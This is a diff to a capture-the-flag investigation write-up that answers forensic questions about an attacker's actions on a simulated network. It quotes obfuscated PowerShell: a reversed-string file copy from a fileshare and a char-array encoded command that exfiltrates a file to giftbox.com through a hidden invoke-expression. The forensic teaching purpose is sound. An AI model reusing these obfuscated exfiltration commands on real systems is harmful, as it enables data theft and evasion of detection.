@@ -125,19 +125,19 @@ When was the attacker's first base64 encoded PowerShell command executed on Alab
 
 What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)
 
-(2023-12-24T16:07:47Z)
+The command executed at the above timestamp is:
 
 `( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''`
 
-echo txt.tsiLeciNythguaN | rev
+The filename has to be reversed using `echo txt.tsiLeciNythguaN | rev`
 
-NaughtyNiceList.txt
+**NaughtyNiceList.txt**
 
   
 
 The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?
 
-(2023-12-24T16:58:43Z)
+The activity was performed (2023-12-24T16:58:43Z)
 
 base64 decoded:  
 [StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*Mdr*').NamE[3,11,2]-joiN
@@ -176,5 +176,5 @@ Beware the Cube that Wombles
 
 **Achievement: KQL Kraken Hunt**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTk5NDM4MzQxNywtMjAxMDE5MjYzXX0=
+eyJoaXN0b3J5IjpbLTMwNTc5ODU0NCwtMjAxMDE5MjYzXX0=
 -->
